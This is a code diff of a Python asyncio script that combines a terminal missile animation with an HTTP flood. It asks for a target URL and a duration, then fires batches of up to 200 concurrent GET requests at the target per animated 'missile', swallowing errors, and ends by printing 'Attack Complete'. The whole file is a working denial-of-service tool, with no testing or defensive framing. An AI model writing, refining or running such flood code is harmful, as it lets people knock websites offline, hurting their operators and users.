@@ -8,7 +8,7 @@ import shutil
 # Terminal size
 TERMINAL_SIZE = shutil.get_terminal_size((80, 40))
 TERMINAL_WIDTH = TERMINAL_SIZE.columns
-TERMINAL_HEIGHT = TERMINAL_SIZE.lines - 4  # leave 4 lines for metrics
+TERMINAL_HEIGHT = TERMINAL_SIZE.lines - 2  # leave 2 lines for bottom
 
 # Clear terminal
 def clear():
@@ -21,7 +21,7 @@ async def countdown_loader(seconds):
         print(f"SG - RELOADING | {i}s")
         await asyncio.sleep(1)
 
-# Perfect small missile (centered)
+# Small missile body
 MISSILE_BODY = [
 "  /\\  ",
 " |=|  ",
@@ -38,10 +38,6 @@ EXHAUST_FRAMES = [
     "\033[93m ::: \033[0m"
 ]
 
-# Global metrics
-total_sent = 0
-max_rps = 0
-
 class Missile:
     def __init__(self):
         self.reset()
@@ -49,94 +45,79 @@ class Missile:
     def reset(self):
         self.x = TERMINAL_WIDTH // 2 - len(MISSILE_BODY[0]) // 2
         self.y = TERMINAL_HEIGHT
+        # speed determines type: 1=avg,2=fast,3=hypersonic
         self.speed = random.choice([1,2,3])
         self.active = False
         self.launch_delay = random.uniform(1,3)
         self.exhaust = random.choice(EXHAUST_FRAMES)
+        # Assign request batch based on speed
+        if self.speed == 3:   # hypersonic
+            self.batch = 200
+        elif self.speed == 2: # fast ballistic
+            self.batch = 100
+        else:                 # average
+            self.batch = 1
 
-    def move(self):
-        if self.active:
-            self.y -= self.speed
-            if self.y < -len(MISSILE_BODY):
-                self.reset()
-                self.active = False
-
-# Draw missile + live metrics
+# Draw missiles with request note
 def draw_missiles(missiles):
-    buffer = [""] * (TERMINAL_HEIGHT)
+    buffer = [""] * TERMINAL_HEIGHT
     for missile in missiles:
         if missile.active:
             for i, line in enumerate(MISSILE_BODY):
                 pos = missile.y - len(MISSILE_BODY) + i
                 if 0 <= pos < TERMINAL_HEIGHT:
-                    buffer[pos] += " " * missile.x + line
+                    # Add note beside missile
+                    if i == 0:  # first line shows batch
+                        buffer[pos] += " " * missile.x + line + f"  [{missile.batch} REQ]"
+                    else:
+                        buffer[pos] += " " * missile.x + line
+            # Exhaust at bottom
             exhaust_pos = missile.y
             if 0 <= exhaust_pos < TERMINAL_HEIGHT:
                 buffer[exhaust_pos] += " " * missile.x + random.choice(EXHAUST_FRAMES)
-
     clear()
     print("\n".join(buffer))
-    # Print live metrics below animation
-    print(f"T-T-S-R: {total_sent}")
-    print(f"M-R-P-S: {max_rps}")
 
-# HTTP requests sender
-async def send_requests(target, duration):
-    global total_sent, max_rps
-    semaphore = asyncio.Semaphore(200)
-    end_time = time.time() + duration
-    local_rps = 0
-    rps_start = time.time()
-
-    async def fetch(session):
-        nonlocal local_rps
-        async with semaphore:
-            try:
-                async with session.get(target) as response:
-                    await response.text()
-                    total_sent += 1
-                    local_rps += 1
-            except:
-                pass
-
+# HTTP request sending per missile batch
+async def send_missile_requests(target, batch):
     async with aiohttp.ClientSession() as session:
-        while time.time() < end_time:
-            tasks = [fetch(session) for _ in range(200)]
+        tasks = []
+        for _ in range(batch):
+            tasks.append(session.get(target))
+        try:
             await asyncio.gather(*tasks)
-            await asyncio.sleep(0.1)
-            # Update max RPS every second
-            if time.time() - rps_start >= 1:
-                max_rps = max(max_rps, local_rps)
-                local_rps = 0
-                rps_start = time.time()
+        except:
+            pass
 
 # Main loop
 async def main():
-    global total_sent, max_rps
     target = input("¿TARGZ > ")
     duration = int(input("¿DU > "))
 
     await countdown_loader(5)
 
-    missiles = [Missile() for _ in range(2)]  # mini swarm cinematic
-
-    # Start HTTP requests
-    request_task = asyncio.create_task(send_requests(target, duration))
+    missiles = [Missile() for _ in range(2)]  # mini swarm
 
     start_time = time.time()
     last_launch_times = [0]*len(missiles)
 
     while time.time() - start_time < duration:
         now = time.time()
+        tasks = []
         for idx, missile in enumerate(missiles):
             if not missile.active and now - last_launch_times[idx] >= missile.launch_delay:
                 missile.active = True
                 last_launch_times[idx] = now
-            missile.move()
+                # Launch requests for this missile
+                tasks.append(send_missile_requests(target, missile.batch))
+            missile.y -= missile.speed
+            if missile.y < -len(MISSILE_BODY):
+                missile.reset()
         draw_missiles(missiles)
+        if tasks:
+            asyncio.create_task(asyncio.gather(*tasks))
         await asyncio.sleep(0.05)
 
-    await request_task
     print("=== TOS-1: Attack Complete ===")
 
 if __name__ == "__main__":
